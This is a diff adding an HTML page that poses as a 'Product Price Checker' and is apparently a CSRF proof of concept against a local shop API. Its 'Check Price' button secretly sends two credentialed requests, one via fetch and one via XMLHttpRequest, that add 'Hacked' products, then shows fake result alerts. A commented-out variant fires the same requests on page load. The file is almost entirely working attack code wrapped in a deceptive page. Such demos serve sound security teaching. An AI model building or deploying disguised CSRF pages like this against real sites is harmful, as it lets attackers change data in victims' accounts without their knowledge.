@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Product Price Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .price-checker {
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔍 Product Price Checker</h1>
+    <div class="price-checker">
+        <h2>Check if a product is in stock</h2>
+        <input type="text" id="productId" placeholder="Enter product ID">
+        <button onclick="checkPrice()">Check Price</button>
+    </div>
+
+    <script>
+        // Function to demonstrate CSRF via fetch
+        async function demonstrateFetchCsrf() {
+            const maliciousProduct = {
+                name: "Hacked via Fetch",
+                description: "Added via CSRF using fetch",
+                price: 999,
+                quantityInStock: 1000,
+                catagory: "Hacked",
+                supplierId: 666
+            };
+
+            try {
+                // Attempt CSRF using fetch with credentials
+                const response = await fetch('http://localhost:3000/api/addProduct', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    credentials: 'include', // This is crucial for CSRF
+                    body: JSON.stringify(maliciousProduct)
+                });
+
+                console.log('Fetch CSRF attempt completed:', response.status);
+            } catch (error) {
+                console.error('Fetch CSRF attempt failed:', error);
+            }
+        }
+
+        // Function to demonstrate CSRF via XMLHttpRequest
+        function demonstrateXhrCsrf() {
+            const maliciousProduct = {
+                name: "Hacked via XHR",
+                description: "Added via CSRF using XMLHttpRequest",
+                price: 888,
+                quantityInStock: 888,
+                catagory: "Hacked",
+                supplierId: 666
+            };
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://localhost:3000/api/addProduct', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.withCredentials = true; // This is crucial for CSRF
+
+            xhr.onload = function() {
+                console.log('XHR CSRF attempt completed:', xhr.status);
+            };
+
+            xhr.onerror = function() {
+                console.error('XHR CSRF attempt failed');
+            };
+
+            xhr.send(JSON.stringify(maliciousProduct));
+        }
+
+        // Legitimate-looking function that actually triggers the attacks
+        function checkPrice() {
+            const productId = document.getElementById('productId').value;
+            if (!productId) {
+                alert('Please enter a product ID');
+                return;
+            }
+
+            // Show fake loading
+            alert('Checking price...');
+
+            // Trigger both CSRF attacks
+            demonstrateFetchCsrf();
+            demonstrateXhrCsrf();
+
+            // Show fake result
+            setTimeout(() => {
+                alert('Price check complete! (The real attack happened in the background)');
+            }, 1000);
+        }
+
+        // Alternative: Trigger attacks on page load
+        // window.onload = function() {
+        //     demonstrateFetchCsrf();
+        //     demonstrateXhrCsrf();
+        // }
+    </script>
+</body>
+</html> 
